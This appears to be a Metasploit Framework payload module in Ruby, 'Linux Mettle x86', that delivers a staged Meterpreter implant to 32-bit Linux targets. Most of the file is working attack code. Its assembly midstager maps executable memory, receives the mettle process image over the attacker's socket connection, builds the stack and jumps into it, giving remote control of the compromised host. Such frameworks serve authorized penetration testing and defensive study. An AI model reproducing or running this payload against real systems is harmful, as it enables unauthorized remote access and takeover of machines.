##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/base/sessions/meterpreter_x86_mettle_linux'
require 'msf/base/sessions/meterpreter_options'
require 'rex/elfparsey'

module MetasploitModule
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'        => 'Linux Mettle x86',
        'Description' => 'Inject the mettle server payload (staged)',
        'Author'      => [
          'William Webb <william_webb[at]rapid7.com>'
        ],
        'Platform'    => 'Linux',
        'Arch'        => ARCH_X86,
        'License'     => MSF_LICENSE,
        'Session'     => Msf::Sessions::Meterpreter_x86_Mettle_Linux
      )
    )
  end

  def elf_ep(payload)
    elf = Rex::ElfParsey::Elf.new(Rex::ImageSource::Memory.new(payload))
    elf.elf_header.e_entry
  end

  def handle_intermediate_stage(conn, payload)
    entry_offset = elf_ep(payload)

    midstager_asm = %(
      push ebx                    ; save sockfd
      xor ebx, ebx                ; address
      mov ecx, #{payload.length}  ; length
      mov edx, 7                  ; PROT_READ | PROT_WRITE | PROT_EXECUTE
      mov esi, 34                 ; MAP_PRIVATE | MAP_ANONYMOUS
      xor edi, edi                ; fd
      xor ebp, ebp                ; pgoffset
      mov eax, 192                ; mmap2
      int 0x80                    ; syscall

      ; receive mettle process image
      mov edx, eax                ; save buf addr for next code block
      pop ebx                     ; sockfd
      push 0x00000100             ; MSG_WAITALL
      push #{payload.length}      ; size
      push eax                    ; buf
      push ebx                    ; sockfd
      mov ecx, esp                ; arg array
      mov ebx, 10                 ; SYS_READ
      mov eax, 102                ; sys_socketcall
      int 0x80                    ; syscall

      ; setup stack
      pop edi
      xor ebx, ebx
      and esp, 0xfffffff0         ; align esp
      add esp, 40
      mov eax, 109
      push eax
      mov esi, esp
      push ebx                    ; NULL
      push ebx                    ; AT_NULL
      push edx                    ; mmap buffer
      mov eax, 7
      push eax                    ; AT_BASE
      push ebx                    ; end of ENV
      push ebx                    ; NULL
      push edi                    ; sockfd
      push esi                    ; m
      mov eax, 2
      push eax                    ; argc

      ; down the rabbit hole
      mov eax, #{entry_offset}
      add edx, eax
      jmp edx
    )

    midstager = Metasm::Shellcode.assemble(Metasm::X86.new, midstager_asm).encode_string
    vprint_status("Transmitting intermediate stager...(#{midstager.length} bytes)")
    conn.put(midstager) == midstager.length
  end

  def generate_stage(_opts = {})
    MetasploitPayloads::Mettle.read('i486-linux-musl', 'mettle.bin')
  end
end
